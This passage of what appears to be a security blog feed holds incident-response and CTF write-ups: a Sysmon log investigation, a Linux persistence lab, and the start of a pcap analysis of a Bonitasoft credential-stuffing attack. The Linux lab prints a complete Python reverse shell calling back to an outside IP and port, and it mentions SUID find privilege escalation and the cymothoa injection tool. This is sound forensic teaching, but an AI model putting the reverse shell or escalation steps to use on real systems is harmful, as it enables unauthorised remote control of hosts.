çš„äº‹ä»¶ï¼Œæ­¤äº‹ä»¶ ID è®°å½•ç³»ç»Ÿä¸Šä»»ä½•æ–‡ä»¶çš„ä»»ä½•æ–‡ä»¶åˆ›å»ºæ—¶é—´å˜åŒ–ã€‚</p><p><img src="https://img.dkdun.cn/v1/2025/12/6fa3f830749adb4f.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">For many <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">files</span> <span class="hljs-keyword">it</span> wrote <span class="hljs-built_in">to</span> disk, <span class="hljs-keyword">the</span> initial malicious <span class="hljs-built_in">file</span> used <span class="hljs-keyword">a</span> defense evasion technique called Time Stomping, where <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> creation <span class="hljs-built_in">date</span> is changed <span class="hljs-built_in">to</span> make <span class="hljs-keyword">it</span> appear older <span class="hljs-keyword">and</span> blend <span class="hljs-keyword">in</span> <span class="hljs-keyword">with</span> other <span class="hljs-built_in">files</span>. What was <span class="hljs-keyword">the</span> timestamp changed <span class="hljs-built_in">to</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> PDF <span class="hljs-built_in">file</span>?<br>:<span class="hljs-number">2024</span><span class="hljs-number">-01</span><span class="hljs-number">-14</span> <span class="hljs-number">08</span>:<span class="hljs-number">10</span>:<span class="hljs-number">06</span><br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p>ç­›é€‰ ID ä¸º 11 çš„äº‹ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/51ac9f49d6ea327b.png"></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">The malicious file dropped a few files on disk. Where was &quot;once.cmd&quot; created on disk? Please answer with the full path along with the filename.<br><span class="hljs-meta">: C:\Users\CyberJunkie\AppData\Roaming\Photo</span> and Fax Vn\Photo and vn 1.1.2\install\F97891C\WindowsVolume\Games\once.cmd <br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p>ç­›é€‰ DNS äº‹ä»¶ï¼ŒID ä¸º 22</p><p><img src="https://img.dkdun.cn/v1/2025/12/e4852961e571c92f.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The malicious <span class="hljs-built_in">file</span> attempted <span class="hljs-built_in">to</span> reach <span class="hljs-keyword">a</span> dummy domain, most likely <span class="hljs-built_in">to</span> check <span class="hljs-keyword">the</span> <span class="hljs-keyword">internet</span> connection status. What domain name did <span class="hljs-keyword">it</span> <span class="hljs-keyword">try</span> <span class="hljs-built_in">to</span> connect <span class="hljs-built_in">to</span>?<br>:www.example.com<br></code></pre></td></tr></table></figure><h1 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h1><p><img src="https://img.dkdun.cn/v1/2025/12/1ed51d5e6606defb.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which IP address did <span class="hljs-keyword">the</span> malicious <span class="hljs-built_in">process</span> <span class="hljs-keyword">try</span> <span class="hljs-built_in">to</span> reach out <span class="hljs-built_in">to</span>?<br>:<span class="hljs-number">93.184</span><span class="hljs-number">.216</span><span class="hljs-number">.34</span><br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>ä¸€æ¡ä¸€æ¡çœ‹ï¼Œç„¶åçœ‹åˆ°æœ‰å…³äº <code>UVncVirtualDisplay</code> çš„è·¯å¾„</p><p><img src="https://img.dkdun.cn/v1/2025/12/b0f504f6aeb99583.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The malicious <span class="hljs-built_in">process</span> terminated itself <span class="hljs-keyword">after</span> infecting <span class="hljs-keyword">the</span> PC <span class="hljs-keyword">with</span> <span class="hljs-keyword">a</span> backdoored variant <span class="hljs-keyword">of</span> UltraVNC. When did <span class="hljs-keyword">the</span> <span class="hljs-built_in">process</span> terminate itself?<br>:<span class="hljs-number">2024</span><span class="hljs-number">-02</span><span class="hljs-number">-14</span> <span class="hljs-number">03</span>:<span class="hljs-number">41</span>:<span class="hljs-number">58</span><br></code></pre></td></tr></table></figure><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>Sysmon ç”Ÿæˆçš„æ¯ç§äº‹ä»¶ç±»å‹çš„ç¤ºä¾‹</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">äº‹ä»¶ <span class="hljs-title class_">ID</span> <span class="hljs-number">1</span><span class="hljs-symbol">:</span>æœ‰å…³æ–°åˆ›å»ºè¿›ç¨‹çš„æ‰©å±•ä¿¡æ¯<br>äº‹ä»¶ <span class="hljs-title class_">ID</span> <span class="hljs-number">2</span><span class="hljs-symbol">:</span>è®°å½•æ›´æ”¹æ–‡ä»¶åˆ›å»ºæ—¶é—´äº‹ä»¶<br>äº‹ä»¶ <span class="hljs-title class_">ID</span> <span class="hljs-number">3</span><span class="hljs-symbol">:</span>ç½‘ç»œè¿æ¥äº‹ä»¶è®°å½•è®¡ç®—æœºä¸Šçš„ <span class="hljs-title class_">TCP</span>/<span class="hljs-title class_">UDP</span> è¿æ¥<br>äº‹ä»¶ <span class="hljs-title class_">ID</span> <span class="hljs-number">11</span><span class="hljs-symbol">:</span>å½“åˆ›å»ºæˆ–è¦†ç›–æ–‡ä»¶æ—¶ï¼Œä¼šè®°å½•æ–‡ä»¶åˆ›å»ºæ“ä½œ<br>äº‹ä»¶ <span class="hljs-title class_">ID</span> <span class="hljs-number">22</span><span class="hljs-symbol">:DNSEvent</span>ï¼ˆ<span class="hljs-title class_">DNS</span> æŸ¥è¯¢ï¼‰<br></code></pre></td></tr></table></figure><p>å…·ä½“äº‹ä»¶ ID è¯¦è§£ï¼š<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Events</a></p>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç„æœº-ç¬¬ä¸‰ç« </title>
    <link href="/2025/03/25/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
    <url>/2025/03/25/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>linux æƒé™ç»´æŒ-éšè—</p><span id="more"></span><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ssh root@env.xj.edisec.net -p  å¯†ç   xjqxwcyc</span><br><span class="language-xml">1.é»‘å®¢éšè—çš„éšè—çš„æ–‡ä»¶ å®Œæ•´è·¯å¾„md5</span><br><span class="language-xml">2.é»‘å®¢éšè—çš„æ–‡ä»¶åå¼¹shellçš„ip+ç«¯å£ </span><span class="hljs-template-variable">&#123;ip:port&#125;</span><span class="language-xml"></span><br><span class="language-xml">3.é»‘å®¢ææƒæ‰€ç”¨çš„å‘½ä»¤ å®Œæ•´è·¯å¾„çš„md5 flag</span><span class="hljs-template-variable">&#123;md5&#125;</span><span class="language-xml"> </span><br><span class="language-xml">4.é»‘å®¢å°è¯•æ³¨å…¥æ¶æ„ä»£ç çš„å·¥å…·å®Œæ•´è·¯å¾„md5</span><br><span class="language-xml">5.ä½¿ç”¨å‘½ä»¤è¿è¡Œ ./x.xx æ‰§è¡Œè¯¥æ–‡ä»¶  å°†æŸ¥è¯¢çš„ Exec****** å€¼ ä½œä¸ºflagæäº¤ flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">xxx</span>/xxx/xxx&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h1><p>ä½¿ç”¨å‘½ä»¤æŸ¥æ‰¾æ–‡ä»¶ï¼Œå‘ç°åœ¨ <code>/tmp</code> ä¸‹è¿˜æœ‰ä¸€ä¸ªéšè—çš„ <code>.temp</code> æ–‡ä»¶å¤¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;.*&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/128843394083324c.png"></p><p>è¿›å…¥æ‰¾åˆ°äº† <code>1.py</code> æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/b699994f9e1585c6.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">109</span>ccb5768c70638e24fb46ee7957e37&#125;<br></code></pre></td></tr></table></figure><h1 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h1><p>ä¸€ä¸ªåå¼¹ shell çš„æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(<span class="hljs-number">0</span>)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((<span class="hljs-string">&quot;114.114.114.121&quot;</span>,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">0</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">1</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">2</span>)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>æ‰¾åˆ° IP å’Œç«¯å£ï¼š114.114.114.121:9999</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">114.114.114.121:9999</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h1><p>ä¸€èˆ¬å…³äºææƒçš„å¯ä»¥å…ˆæŸ¥æ‰¾è·Ÿ <code>suid</code> æœ‰å…³çš„ä¸œè¥¿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:~# find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/bin/mount<br>/bin/ping<br>/bin/ping6<br>/bin/su<br>/bin/umount<br>/usr/bin/chfn<br>/usr/bin/chsh<br>/usr/bin/find<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/usr/bin/passwd<br>/usr/bin/sudo<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿‡æ»¤å‡ºæ¥äº†ä¸€ä¸ª <code>find</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/a8f53deedf44cf0c.png"></p><p>find ä¹Ÿå¯ä»¥ææƒï¼š<a href="https://gtfobins.github.io/gtfobins/find/">find</a>ï¼Œæ‰€ä»¥è·¯å¾„ä¸ºï¼š <code>/usr/bin/find</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">7</span>fd5884f493f4aaf96abee286ee04120&#125;<br></code></pre></td></tr></table></figure><h1 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h1><p>æŸ¥æ‰¾éšè—çš„æ–‡ä»¶å¤¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">type</span> d -name <span class="hljs-string">&quot;.*&quot;</span> -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/83c4c3b40a572248.png"></p><p>è¿›å…¥ <code>/opt/.cymothoa-1-beta</code>ï¼Œå‘ç°äº† <code>cymothoa</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/5d0a3afbf8b67511.png"></p><p><code>cymothoa</code> æ˜¯ä¸€æ¬¾éšç§˜çš„åé—¨å·¥å…·ã€‚å®ƒé€šè¿‡å‘ç›®æ ‡ä¸»æœºæ´»è·ƒçš„è¿›ç¨‹æ³¨å…¥æ¶æ„ä»£ç ï¼Œä»è€Œè·å–å’ŒåŸè¿›ç¨‹ç›¸åŒçš„æƒé™ï¼Œå·¥å…·æœ€å¤§çš„ä¼˜ç‚¹å°±æ˜¯ä¸åˆ›å»ºæ–°çš„è¿›ç¨‹ï¼Œä¸å®¹æ˜“è¢«å‘ç°ï¼Œæ‰€ä»¥å°è¯•æ³¨å…¥æ¶æ„ä»£ç çš„å·¥å…·å®Œæ•´è·¯å¾„ä¸ºï¼š<code>/opt/.cymothoa-1-beta/cymothoa</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">087</span>c267368ece4fcf422ff733b51aed9&#125;<br></code></pre></td></tr></table></figure><h1 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h1><h2 id="Method-1"><a href="#Method-1" class="headerlink" title="Method 1"></a>Method 1</h2><p>æ‰§è¡Œ <code>1.py</code> æ–‡ä»¶ï¼Œå› ä¸ºå‰é¢çŸ¥é“æ–‡ä»¶ <code>#!/usr/bin/python3</code>ï¼Œç”¨ python3 æ‰§è¡Œï¼Œæ ¹æ® PID æŸ¥æ‰¾</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:/# python3 /tmp/.temp/libprocesshider/1.py<br>root@xuanji:/# ps -ef | grep <span class="hljs-string">&quot;1.py&quot;</span><br>root         428       1  0 14:25 ?        00:00:00 python3 /tmp/.temp/libprocesshider/1.py<br>root         430     405  0 14:25 pts/0    00:00:00 grep --color=auto 1.py<br>root@xuanji:/# ll /proc/428/exe<br>lrwxrwxrwx. 1 root root 0 Mar 25 14:25 /proc/428/exe -&gt; /usr/bin/python3.4*<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ flag ä¸º</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">usr</span>/bin/python3.4&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Method-2"><a href="#Method-2" class="headerlink" title="Method 2"></a>Method 2</h2><p>è¿˜å¯ä»¥æ‰§è¡Œä¹‹æŸ¥æ‰¾ <code>python3</code> çš„è¿è¡Œæƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@xuanji:/# python3 /tmp/.temp/libprocesshider/1.py<br>root@xuanji:/# <span class="hljs-built_in">which</span> python3<br>/usr/bin/python3<br>root@xuanji:/# <span class="hljs-built_in">ls</span> -al /usr/bin/python3<br>lrwxrwxrwx. 1 root root 9 Mar 23  2014 /usr/bin/python3 -&gt; python3.4<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
      <category>ç„æœº</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Meerkat</title>
    <link href="/2025/03/25/HTB-Meerkat/"/>
    <url>/2025/03/25/HTB-Meerkat/</url>
    
    <content type="html"><![CDATA[<p>Levelï¼šEasy</p><span id="more"></span><h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>As a fast-growing startup, Forela has been utilising a business management platform. Unfortunately, our documentation is scarce, and our administrators arenâ€™t the most security aware. As our new security provider weâ€™d like you to have a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</p><h1 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h1><p>å¯¹äºæµé‡åŒ…ï¼Œæˆ‘çš„ä¹ æƒ¯æ˜¯ä» http åè®®çš„æµé‡å¼€å§‹åˆ†æï¼Œæ‰€ä»¥å…ˆè¿‡æ»¤ http æµé‡ï¼Œè€Œä¸” 4 å¼€å¤´çš„çŠ¶æ€ç éƒ½æ²¡ç”¨</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http&amp;&amp;!http.response.code &gt; 400<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/2d3eff5a57f21a52.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤š POST è¯·æ±‚</p><p><img src="https://img.dkdun.cn/v1/2025/12/9eaa566db23c9844.png"></p><p>è¿½è¸ª TCP æµå‘ç°åº”è¯¥æ˜¯åœ¨è¿›è¡Œç™»å½•ï¼Œè¿™å¤§é‡çš„è¯·æ±‚æŒºåƒåœ¨çˆ†ç ´çš„</p><p><img src="https://img.dkdun.cn/v1/2025/12/1de875aa12ca6e20.png"></p><p>è°·æ­Œæœç´¢ <code>bonita</code> å‘ç°äº†è½¯ä»¶ï¼Œâ€œGet limitless extensibility with Bonita, the process automation platform that doesnâ€™t lock you inâ€ï¼Œä¸€ä¸ªæµç¨‹è‡ªåŠ¨åŒ–å¹³å°ï¼Œæ‰€ä»¥ç­”æ¡ˆä¸º <code>bonitasoft</code></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">We <span class="hljs-keyword">believe </span>our <span class="hljs-keyword">Business </span>Management Platform server has <span class="hljs-keyword">been </span>compromised. Please can you confirm the name of the application running?<br>:<span class="hljs-keyword">BonitaSoft</span><br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>ä»æ•°æ®ä¸­å¯ä»¥çœ‹å‡º <code>156.146.62.213</code> ä¸€ç›´åœ¨å‘ <code>172.31.6.44</code> çš„ <code>/bonita/loginservice</code> å‘é€è¯·æ±‚ï¼Œè¿½è¸ªæµä¼šå‘ç°æ¯ä¸ªåŒ…çš„è¯·æ±‚çš„ <code>username</code> å’Œ <code>password</code> å­—æ®µçš„å€¼éƒ½ä¸ä¸€æ ·ï¼Œç¡®å®åº”è¯¥æ˜¯åœ¨çˆ†ç ´</p><p><img src="https://img.dkdun.cn/v1/2025/12/d15abedf4025b4c8.png"></p><p>çœ‹äº†ä¸€äº›æ•°æ®ä¹‹åä¼šå‘ç°æœ‰ä¸€å®šçš„è§„å¾‹ï¼Œç”¨æˆ·åå¤§å¤šæ•°ä»¥ <code>@forela.co.uk</code> ç»“å°¾ï¼Œä¸ä»…å¦‚æ­¤è¿˜æœ‰ <code>install</code> ç”¨æˆ·çš„è¯·æ±‚ä¿¡æ¯</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">install</span>:<span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><p><a href="https://documentation.bonitasoft.com/bonita/latest/identity/tenant-admin-credentials">Tenant administrator credentials</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/edf61a39ff651bde.png"></p><p><code>install</code>  æ˜¯ Bonitasoft çš„é»˜è®¤ç”¨æˆ·ï¼Œå¯ä»¥çŒœä¸€ä¸‹å¯èƒ½æ˜¯æœ‰æ³„éœ²çš„ä¸€äº›è´¦æˆ·ï¼Œç¬¦åˆ <a href="https://attack.mitre.org/techniques/T1110/004/">Brute Force: Credential Stuffing</a> æ¡ä»¶ï¼Œæš´åŠ›ç ´è§£çš„ä¸€ç§æŠ€æœ¯ï¼šå‡­è¯å¡«å……ï¼Œä¹Ÿå«æ’åº“æ”»å‡»</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">We believe <span class="hljs-keyword">the</span> attacker may have used <span class="hljs-keyword">a</span> subset <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> brute forcing attack category - what is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> attack carried out?<br>:Credential Stuffing<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p>ç”¨ <code>jq</code> è·å–æ–‡ä»¶ä¸­ä¸åŒè­¦æŠ¥ç­¾å <code>alert.signature</code> å­—æ®µå‡ºç°æ¬¡æ•°ï¼Œç„¶åæŒ‰ç…§æ¬¡æ•°ä»é«˜åˆ°ä½æ’åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# <span class="hljs-built_in">cat</span> <span class="hljs-string">&#x27;/mnt/f/æ¸—é€/HackTheBox/meerkat/meerkat-alerts.json&#x27;</span> | jq <span class="hljs-string">&#x27;.[].alert.signature&#x27;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -nr<br>    134 <span class="hljs-string">&quot;ET INFO User-Agent (python-requests) Inbound to Webserver&quot;</span><br>     59 <span class="hljs-string">&quot;ET WEB_SPECIFIC_APPS Bonitasoft Default User Login Attempt M1 (Possible Staging for CVE-2022-25237)&quot;</span><br>     17 <span class="hljs-string">&quot;ET DROP Dshield Block Listed Source group 1&quot;</span><br>     12 <span class="hljs-string">&quot;ET EXPLOIT Bonitasoft Authorization Bypass M1 (CVE-2022-25237)&quot;</span><br>      6 <span class="hljs-string">&quot;ET POLICY GNU/Linux APT User-Agent Outbound likely related to package management&quot;</span><br>      4 <span class="hljs-string">&quot;GPL WEB_SERVER DELETE attempt&quot;</span><br>      4 <span class="hljs-string">&quot;ET EXPLOIT Bonitasoft Successful Default User Login Attempt (Possible Staging for CVE-2022-25237)&quot;</span><br>      4 <span class="hljs-string">&quot;ET EXPLOIT Bonitasoft Authorization Bypass and RCE Upload M1 (CVE-2022-25237)&quot;</span><br>      3 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 84&quot;</span><br>      3 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 82&quot;</span><br>      2 null<br>      1 <span class="hljs-string">&quot;GPL SNMP public access udp&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to PostgreSQL port 5432&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to Oracle SQL port 1521&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to mySQL port 3306&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Suspicious inbound to MSSQL port 1433&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Potential VNC Scan 5900-5920&quot;</span><br>      1 <span class="hljs-string">&quot;ET SCAN Potential VNC Scan 5800-5820&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 81&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 76&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 31&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 29&quot;</span><br>      1 <span class="hljs-string">&quot;ET CINS Active Threat Intelligence Poor Reputation IP group 13&quot;</span><br>      1 <span class="hljs-string">&quot;ET ATTACK_RESPONSE Possible /etc/passwd via HTTP (linux style)&quot;</span><br>      1 <span class="hljs-string">&quot;ET 3CORESec Poor Reputation IP group 42&quot;</span><br>      1 <span class="hljs-string">&quot;ET 3CORESec Poor Reputation IP group 18&quot;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°é¢‘ç¹å‡ºç°äº† <code>CVE-2022-25237</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">jq <span class="hljs-string">&#x27;.[].alert.signature&#x27;</span> <span class="hljs-string">&#x27;/mnt/f/æ¸—é€/HackTheBox/meerkat/meerkat-alerts.json&#x27;</span> | grep CVE<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ee5943192138b836.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Does <span class="hljs-keyword">the</span> vulnerability exploited have <span class="hljs-keyword">a</span> CVE assigned - <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span> so, which <span class="hljs-literal">one</span>?<br>:CVE<span class="hljs-number">-2022</span><span class="hljs-number">-25237</span><br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>â€œi18ntranslation or &#x2F;..&#x2F;i18ntranslation&#x2F; to the end of a URLâ€ </p><p><img src="https://img.dkdun.cn/v1/2025/12/0d2bbbd0045f432d.png"></p><p>åŒæ ·ï¼Œæˆ‘ä»¬åœ¨æµé‡åŒ…é‡Œè¿‡æ»¤ä¸€ä¸‹ä¹Ÿèƒ½å‘ç°</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 